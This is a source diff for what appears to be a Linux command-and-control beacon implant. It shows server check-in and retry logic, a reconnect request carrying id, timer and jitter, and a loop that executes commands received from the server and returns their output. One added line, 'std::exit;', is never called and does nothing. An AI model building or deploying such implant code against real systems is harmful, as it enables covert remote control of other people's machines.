@@ -15,14 +15,8 @@
 
 #ifdef __unix__
 
-#ifdef DEBUG 
-#define OS "Linux (DEBUG)"
-#else
-#define OS "Linux"
-#endif
-
 #include "../../Linux/Beacon/beacon_commands.hpp"
-#include "../..//Linux/generic.hpp"
+#include "../../Linux/generic.hpp"
 #include <chrono>
 #include <thread>
 #endif
@@ -103,13 +97,13 @@ std::tuple<int, std::string, std::string> getRequest(const std::string& url) {
 }
 
 int retryRequest(const std::string& url, int attempts, int sleepTime) {
-    logger.log("Retrying request for URL: " + url + " for up to " + std::to_string(attempts) + " attempts.");
+    logger.warn("Retrying request for URL: " + url + " for up to " + std::to_string(attempts) + " attempts.");
     for (int count = 0; count < attempts; ++count) {
-        logger.log("Retry attempt " + std::to_string(count + 1));
+        logger.warn("Retry attempt " + std::to_string(count + 1));
         sleepFor(sleepTime);
         auto [response_code, response_body, response_url] = getRequest(url);
         if (response_code == 200) {
-            logger.log("Retry attempt " + std::to_string(count + 1) + " succeeded with response code 200");
+            logger.warn("Retry attempt " + std::to_string(count + 1) + " succeeded with response code 200");
             return 0;
         } else {
             logger.error("Retry attempt " + std::to_string(count + 1) + " failed with response code: " + std::to_string(response_code));
@@ -222,6 +216,10 @@ std::tuple<int, std::string, int> httpReconnect(const std::string& address, cons
     requestData["name"] = hostname;
     requestData["os"] = OS;
     requestData["address"] = "127.0.0.1"; // temporary value
+    requestData["id"] = ID;
+    requestData["timer"] = TIMER;
+    requestData["jitter"] = JITTER;
+
 
     auto [response_code, response_body] = postRequest(reconnectURL, requestData.toStyledString());
     if (response_code == -1) {
@@ -232,6 +230,7 @@ std::tuple<int, std::string, int> httpReconnect(const std::string& address, cons
     try {
         if (response_code == 200) {
             logger.log("httpReconnect succeeded.");
+            logger.log("ResponseBody: " + response_body);
             return std::make_tuple(response_code, response_body, 0);
         } else {
             logger.error("httpReconnect failed with response: " + std::to_string(response_code) + " " + response_body);
@@ -265,6 +264,14 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
             std::string cmd_data = command["data"].asString();
             logger.log("Executing command: " + cmd + " with uuid: " + cmd_uuid);
             std::string output = command_handler(cmd, cmd_data, cmd_uuid);
+            if (cmd == "session") {
+                logger.warn("Exited Session HTTP reconnecting");
+                auto result = httpReconnect(URL, ID, JITTER, TIMER);
+                if (std::get<0>(result) == -1) {
+                    logger.error("Unable to reconnect");
+                    std::exit;
+                }
+            }
             Json::Value json_data;
             json_data["output"] = output;
             json_data["command_uuid"] = cmd_uuid;
@@ -291,9 +298,9 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
             std::cerr << "Invalid timer value received: " << newTimer << std::endl;
         }
     }
-
-    return false;
+    return true;
 }
+
 
 int beacon() {
     logger.log("Starting beacon function");
